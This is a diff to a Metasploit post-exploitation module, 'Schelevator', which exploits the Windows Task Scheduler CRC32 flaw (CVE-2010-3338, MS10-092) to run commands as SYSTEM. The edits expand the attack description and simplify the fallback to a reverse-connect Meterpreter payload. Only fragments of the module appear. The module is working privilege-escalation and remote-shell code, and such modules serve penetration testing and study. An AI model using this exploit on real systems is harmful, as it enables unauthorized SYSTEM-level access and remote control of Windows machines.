@@ -17,10 +17,16 @@ require 'zlib'
 class Metasploit3 < Msf::Post
 
 	def initialize(info={})
-		super( update_info( info,
+		super(update_info(info,
 			'Name'          => 'Schelevator',
 			'Description'   => %q{
-				This module exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.
+					This module exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.
+				When processing task files, the Windows Task Scheduler only uses a CRC32 
+				checksum to validate that the file has not been tampered with. Also, In a default
+				configuration, normal users can read and write the task files that they have
+				created. By modifying the task file and creating a CRC32 collision, an attacker
+				can execute arbitrary commands with SYSTEM privileges.
+
 				NOTE: Thanks to webDEViL for the information about disable/enable.
 			},
 			'License'       => MSF_LICENSE,
@@ -28,19 +34,20 @@ class Metasploit3 < Msf::Post
 			'Version'       => '$Revision$',
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ],
-			'References'    => [
-				[ 'CVE', '2010-3338' ],
-				[ 'MSB', '10-092' ],
-				[ 'URL', 'http://www.exploit-db.com/exploits/15589/' ]
-			],
-			'DisclosureDate'=> "Oct 22, 2010"
+			'References'    =>
+				[
+					[ 'CVE', '2010-3338' ],
+					[ 'MSB', 'MS10-092' ],
+					[ 'URL', 'http://www.exploit-db.com/exploits/15589/' ]
+				],
+			'DisclosureDate'=> "Oct 22 2010"
 		))
 
 		register_options([
 			OptString.new("CMD",      [ false, "Command to execute instead of a payload" ]),
 			OptString.new("TASKNAME", [ false, "A name for the created task (default random)" ]),
 			OptAddress.new("RHOST",   [ false, "Host" ]),
-			OptPort.new("RPORT",      [ false, "Port", 4444 ]),
+			OptPort.new("RPORT",      [ false, "Port", 4444 ])
 		])
 
 	end
@@ -77,9 +84,8 @@ class Metasploit3 < Msf::Post
 		cmd = datastore["CMD"] || nil
 		upload_fn = nil
 
-		# Must have at least one of -c or -u
-		if not cmd and not upload_fn
-			print_status("Using default reverse-connect meterpreter payload; -c or -u not specified")
+		if not cmd
+			print_status("Using default reverse-connect meterpreter payload; no CMD specified")
 
 			# Get the exe payload.
 			pay = session.framework.payloads.create("windows/meterpreter/reverse_tcp")
@@ -112,9 +118,7 @@ class Metasploit3 < Msf::Post
 				'Payload'  => handler.datastore['PAYLOAD'],
 				'RunAsJob' => true
 			)
-		end
-
-		if cmd
+		else
 			print_status("Using command: #{cmd}")
 		end
 
